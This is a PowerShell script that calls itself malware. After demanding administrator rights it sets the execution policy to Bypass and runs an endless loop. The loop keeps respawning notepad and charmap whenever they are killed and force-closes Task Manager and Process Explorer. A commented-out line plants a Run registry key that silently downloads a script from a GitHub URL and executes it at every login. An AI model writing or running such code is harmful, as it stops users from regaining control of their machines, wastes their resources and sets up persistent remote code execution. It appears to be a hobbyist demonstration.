# Creates two independent processes that check each other and respawn whenever it is killed, runs infinitely
# This is malware, do not run this script on your machine (unless you know what you are doing)

Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force

$evilProcess1 = "notepad"
$evilProcess2 = "charmap"

function duelingProcesses() {
    SpawnProcesses
    MonitorProcesses
}

function GetLength() {
    # Count processes by their name (no need for 'Path')
    $processLength1 = (Get-Process -Name $evilProcess1 -ErrorAction SilentlyContinue).Count
    $processLength2 = (Get-Process -Name $evilProcess2 -ErrorAction SilentlyContinue).Count
    
    # Handle null results for missing processes
    $processLength1 = if ($processLength1 -eq $null) { 0 } else { $processLength1 }
    $processLength2 = if ($processLength2 -eq $null) { 0 } else { $processLength2 }
    
    Write-Host -ForegroundColor Yellow "Currently running $evilProcess1 : $processLength1 and $evilProcess2 : $processLength2"
    return $processLength1 + $processLength2
}

function SpawnProcesses() {
    Write-Host -ForegroundColor Blue "Running Notepad and Charmap..."
    Start-Process -FilePath "notepad.exe"
    Start-Process -FilePath "charmap.exe"
}

function MonitorProcesses() {
    $processCount = 2
    while ($true) {
        $currentProcessCount = GetLength
        
        # Check if process count is not as expected
        if ($currentProcessCount -lt $processCount) {
            Write-Host -ForegroundColor Red "Mismatch detected. Spawning both processes again..."
            SpawnProcesses
            $processCount++
            Write-Host -ForegroundColor Red "Process Count Threshold increased to $processCount"
            #Start-Sleep -Milliseconds 500 # Delay to reduce CPU usage
        } else {
            Write-Host -ForegroundColor Green "Process count is okay. $currentProcessCount processes running."
            #Start-Sleep -Milliseconds 500 # Delay to reduce CPU usage
        }

        # Kill Task Manager if running
        if (Get-Process -Name "taskmgr" -ErrorAction SilentlyContinue) {
            Write-Host -ForegroundColor Yellow "Task Manager is running. Killing it..."
            Stop-Process -Name "taskmgr" -Force
        }

        # Kill Process Explorer if running
        if (Get-Process -Name "procexp" -ErrorAction SilentlyContinue) {
            Write-Host -ForegroundColor Yellow "Process Explorer is running. Killing it..."
            Stop-Process -Name "procexp" -Force
        }
    }
}

Clear-Host
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $wshell = New-Object -ComObject WScript.Shell
    $wshell.Popup("Run the script as Administrator.", 0, "No", 16)
    Write-Host -ForegroundColor Red "Run the script as Administrator."
    exit
} else {
    #currently not functioning
    #reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v EvilMalware /t REG_SZ /d "powershell.exe -WindowStyle Hidden -Command \"iwr -Uri 'https://raw.githubusercontent.com/Ben-Does-Arcade/win-persistent-processes/refs/heads/dev/evilmalware.ps1' -OutFile '%TEMP%\evilmalware.ps1'; '%TEMP%\evilmalware.ps1'\"" /f | Out-Null
    duelingProcesses
}
